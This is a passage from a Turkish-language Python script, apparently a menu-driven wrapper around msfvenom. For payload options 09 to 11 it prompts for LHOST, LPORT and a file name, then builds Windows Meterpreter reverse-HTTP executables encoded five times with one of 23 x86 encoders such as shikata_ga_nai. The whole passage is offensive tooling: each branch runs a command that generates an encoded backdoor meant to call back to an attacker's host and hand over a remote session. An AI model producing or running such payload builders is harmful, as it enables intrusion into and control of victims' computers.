            e8 = 'x86/call4_dword_xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e8} -i 5')
        elif encoder == '09':
            e9 = 'x86/context_cpuid'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e9} -i 5')
        elif encoder == '10':
            e10 = 'x86/context_stat'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e10} -i 5')
        elif encoder == '11':
            e11 = 'x86/context_time'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e11} -i 5')
        elif encoder == '12':
            e12 = 'x86/countdown'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e12} -i 5')
        elif encoder == '13':
            e13 = 'x86/fnstenv_mov'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e13} -i 5')
        elif encoder == '14':
            e14 = 'x86/jmp_call_additive'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e14} -i 5')
        elif encoder == '15':
            e15 = 'x86/nonalpha'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e15} -i 5')
        elif encoder == '16':
            e16 = 'x86/nonupper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e16} -i 5')
        elif encoder == '17':
            e17 = 'x86/opt_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e17} -i 5')
        elif encoder == '18':
            e18 = 'x86/service'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e18} -i 5')
        elif encoder == '19':
            e19 = 'x86/shikata_ga_nai'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e19} -i 5')
        elif encoder == '20':
            e20 = 'x86/single_static_bit'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e20} -i 5')
        elif encoder == '21':
            e21 = 'x86/unicode_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e21} -i 5')
        elif encoder == '22':
            e22 = 'x86/unicode_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e22} -i 5')
        elif encoder == '23':
            e23 = 'x86/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p8} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e23} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print(f'{RED}HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '09':
        p9 = 'windows/meterpreter_reverse_http'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x86/add_sub')
        print(f'{WHITE}[02] {MAGENTA}x86/alpha_mixed')
        print(f'{WHITE}[03] {MAGENTA}x86/alpha_upper')
        print(f'{WHITE}[04] {MAGENTA}x86/avoid_underscore_tolower')
        print(f'{WHITE}[05] {MAGENTA}x86/avoid_utf8_tolower')
        print(f'{WHITE}[06] {MAGENTA}x86/bloxor')
        print(f'{WHITE}[07] {MAGENTA}x86/bmp_polyglot')
        print(f'{WHITE}[08] {MAGENTA}x86/call4_dword_xor')
        print(f'{WHITE}[09] {MAGENTA}x86/context_cpuid')
        print(f'{WHITE}[10] {MAGENTA}x86/context_stat')
        print(f'{WHITE}[11] {MAGENTA}x86/context_time')
        print(f'{WHITE}[12] {MAGENTA}x86/countdown')
        print(f'{WHITE}[13] {MAGENTA}x86/fnstenv_mov')
        print(f'{WHITE}[14] {MAGENTA}x86/jmp_call_additive')
        print(f'{WHITE}[15] {MAGENTA}x86/nonalpha')
        print(f'{WHITE}[16] {MAGENTA}x86/nonupper')
        print(f'{WHITE}[17] {MAGENTA}x86/opt_sub')
        print(f'{WHITE}[18] {MAGENTA}x86/service')
        print(f'{WHITE}[19] {MAGENTA}x86/shikata_ga_nai')
        print(f'{WHITE}[20] {MAGENTA}x86/single_static_bit')
        print(f'{WHITE}[21] {MAGENTA}x86/unicode_mixed')
        print(f'{WHITE}[22] {MAGENTA}x86/unicode_upper')
        print(f'{WHITE}[23] {MAGENTA}x86/xor_dynamic')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        encoder = encoder.zfill(2)
        print(f'{BLUE}===============================================')
        if encoder == '01':
            e1 = 'x86/add_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x86/alpha_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x86/alpha_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x86/avoid_underscore_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e4} -i 5')
        elif encoder == '05':
            e5 = 'x86/avoid_utf8_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e5} -i 5')
        elif encoder == '06':
            e6 = 'x86/bloxor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e6} -i 5')
        elif encoder == '07':
            e7 = 'x86/bmp_polyglot'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e7} -i 5')
        elif encoder == '08':
            e8 = 'x86/call4_dword_xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e8} -i 5')
        elif encoder == '09':
            e9 = 'x86/context_cpuid'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e9} -i 5')
        elif encoder == '10':
            e10 = 'x86/context_stat'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e10} -i 5')
        elif encoder == '11':
            e11 = 'x86/context_time'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e11} -i 5')
        elif encoder == '12':
            e12 = 'x86/countdown'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e12} -i 5')
        elif encoder == '13':
            e13 = 'x86/fnstenv_mov'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e13} -i 5')
        elif encoder == '14':
            e14 = 'x86/jmp_call_additive'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e14} -i 5')
        elif encoder == '15':
            e15 = 'x86/nonalpha'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e15} -i 5')
        elif encoder == '16':
            e16 = 'x86/nonupper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e16} -i 5')
        elif encoder == '17':
            e17 = 'x86/opt_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e17} -i 5')
        elif encoder == '18':
            e18 = 'x86/service'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e18} -i 5')
        elif encoder == '19':
            e19 = 'x86/shikata_ga_nai'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e19} -i 5')
        elif encoder == '20':
            e20 = 'x86/single_static_bit'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e20} -i 5')
        elif encoder == '21':
            e21 = 'x86/unicode_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e21} -i 5')
        elif encoder == '22':
            e22 = 'x86/unicode_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e22} -i 5')
        elif encoder == '23':
            e23 = 'x86/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p9} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e23} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print('HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '10':
        p10 = 'windows/meterpreter_reverse_http'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x86/add_sub')
        print(f'{WHITE}[02] {MAGENTA}x86/alpha_mixed')
        print(f'{WHITE}[03] {MAGENTA}x86/alpha_upper')
        print(f'{WHITE}[04] {MAGENTA}x86/avoid_underscore_tolower')
        print(f'{WHITE}[05] {MAGENTA}x86/avoid_utf8_tolower')
        print(f'{WHITE}[06] {MAGENTA}x86/bloxor')
        print(f'{WHITE}[07] {MAGENTA}x86/bmp_polyglot')
        print(f'{WHITE}[08] {MAGENTA}x86/call4_dword_xor')
        print(f'{WHITE}[09] {MAGENTA}x86/context_cpuid')
        print(f'{WHITE}[10] {MAGENTA}x86/context_stat')
        print(f'{WHITE}[11] {MAGENTA}x86/context_time')
        print(f'{WHITE}[12] {MAGENTA}x86/countdown')
        print(f'{WHITE}[13] {MAGENTA}x86/fnstenv_mov')
        print(f'{WHITE}[14] {MAGENTA}x86/jmp_call_additive')
        print(f'{WHITE}[15] {MAGENTA}x86/nonalpha')
        print(f'{WHITE}[16] {MAGENTA}x86/nonupper')
        print(f'{WHITE}[17] {MAGENTA}x86/opt_sub')
        print(f'{WHITE}[18] {MAGENTA}x86/service')
        print(f'{WHITE}[19] {MAGENTA}x86/shikata_ga_nai')
        print(f'{WHITE}[20] {MAGENTA}x86/single_static_bit')
        print(f'{WHITE}[21] {MAGENTA}x86/unicode_mixed')
        print(f'{WHITE}[22] {MAGENTA}x86/unicode_upper')
        print(f'{WHITE}[23] {MAGENTA}x86/xor_dynamic')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        encoder = encoder.zfill(2)
        print(f'{BLUE}===============================================')
        if encoder == '01':
            e1 = 'x86/add_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x86/alpha_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x86/alpha_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x86/avoid_underscore_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e4} -i 5')
        elif encoder == '05':
            e5 = 'x86/avoid_utf8_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e5} -i 5')
        elif encoder == '06':
            e6 = 'x86/bloxor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e6} -i 5')
        elif encoder == '07':
            e7 = 'x86/bmp_polyglot'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e7} -i 5')
        elif encoder == '08':
            e8 = 'x86/call4_dword_xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e8} -i 5')
        elif encoder == '09':
            e9 = 'x86/context_cpuid'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e9} -i 5')
        elif encoder == '10':
            e10 = 'x86/context_stat'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e10} -i 5')
        elif encoder == '11':
            e11 = 'x86/context_time'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e11} -i 5')
        elif encoder == '12':
            e12 = 'x86/countdown'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e12} -i 5')
        elif encoder == '13':
            e13 = 'x86/fnstenv_mov'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e13} -i 5')
        elif encoder == '14':
            e14 = 'x86/jmp_call_additive'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e14} -i 5')
        elif encoder == '15':
            e15 = 'x86/nonalpha'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e15} -i 5')
        elif encoder == '16':
            e16 = 'x86/nonupper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e16} -i 5')
        elif encoder == '17':
            e17 = 'x86/opt_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e17} -i 5')
        elif encoder == '18':
            e18 = 'x86/service'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e18} -i 5')
        elif encoder == '19':
            e19 = 'x86/shikata_ga_nai'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e19} -i 5')
        elif encoder == '20':
            e20 = 'x86/single_static_bit'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e20} -i 5')
        elif encoder == '21':
            e21 = 'x86/unicode_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e21} -i 5')
        elif encoder == '22':
            e22 = 'x86/unicode_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e22} -i 5')
        elif encoder == '23':
            e23 = 'x86/xor_dynamic'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p10} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e23} -i 5')
        else:
            print(f'{BLUE}===============================================')
            print('HATALI TUŞLAMA!')
            print(f'{BLUE}===============================================')
##################################################################
    elif payload == '11':
        p11 = 'windows/meterpreter_reverse_http'
        lhost = input(f'{CYAN}LHOST{RED}:  ')
        lport = input(f'{CYAN}LPORT{RED}:  ')
        payloadname = input(f'{CYAN}Payloadınıza bir isim verin{RED}(test.exe):  ')
        print(f'{BLUE}===============================================')
        print(f'{WHITE}[01] {MAGENTA}x86/add_sub')
        print(f'{WHITE}[02] {MAGENTA}x86/alpha_mixed')
        print(f'{WHITE}[03] {MAGENTA}x86/alpha_upper')
        print(f'{WHITE}[04] {MAGENTA}x86/avoid_underscore_tolower')
        print(f'{WHITE}[05] {MAGENTA}x86/avoid_utf8_tolower')
        print(f'{WHITE}[06] {MAGENTA}x86/bloxor')
        print(f'{WHITE}[07] {MAGENTA}x86/bmp_polyglot')
        print(f'{WHITE}[08] {MAGENTA}x86/call4_dword_xor')
        print(f'{WHITE}[09] {MAGENTA}x86/context_cpuid')
        print(f'{WHITE}[10] {MAGENTA}x86/context_stat')
        print(f'{WHITE}[11] {MAGENTA}x86/context_time')
        print(f'{WHITE}[12] {MAGENTA}x86/countdown')
        print(f'{WHITE}[13] {MAGENTA}x86/fnstenv_mov')
        print(f'{WHITE}[14] {MAGENTA}x86/jmp_call_additive')
        print(f'{WHITE}[15] {MAGENTA}x86/nonalpha')
        print(f'{WHITE}[16] {MAGENTA}x86/nonupper')
        print(f'{WHITE}[17] {MAGENTA}x86/opt_sub')
        print(f'{WHITE}[18] {MAGENTA}x86/service')
        print(f'{WHITE}[19] {MAGENTA}x86/shikata_ga_nai')
        print(f'{WHITE}[20] {MAGENTA}x86/single_static_bit')
        print(f'{WHITE}[21] {MAGENTA}x86/unicode_mixed')
        print(f'{WHITE}[22] {MAGENTA}x86/unicode_upper')
        print(f'{WHITE}[23] {MAGENTA}x86/xor_dynamic')
        print(f'{BLUE}===============================================')
        encoder = input(f'{CYAN}Payloadınıza bir encoder belirleyin{RED}:  ')
        encoder = encoder.zfill(2)
        print(f'{BLUE}===============================================')
        if encoder == '01':
            e1 = 'x86/add_sub'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e1} -i 5')
        elif encoder == '02':
            e2 = 'x86/alpha_mixed'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e2} -i 5')
        elif encoder == '03':
            e3 = 'x86/alpha_upper'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e3} -i 5')
        elif encoder == '04':
            e4 = 'x86/avoid_underscore_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e4} -i 5')
        elif encoder == '05':
            e5 = 'x86/avoid_utf8_tolower'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e5} -i 5')
        elif encoder == '06':
            e6 = 'x86/bloxor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e6} -i 5')
        elif encoder == '07':
            e7 = 'x86/bmp_polyglot'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e7} -i 5')
        elif encoder == '08':
            e8 = 'x86/call4_dword_xor'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e8} -i 5')
        elif encoder == '09':
            e9 = 'x86/context_cpuid'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
            print(f'{BLUE}===============================================')
            system(f'msfvenom -p {p11} LHOST={lhost} LPORT={lport} -f exe -a x86 -o {payloadname} --platform windows -e {e9} -i 5')
        elif encoder == '10':
            e10 = 'x86/context_stat'
            print(f'{BLUE}===============================================')
            print(f'{GREEN}PAYLODINIZ OLUŞTURULUYOR...')
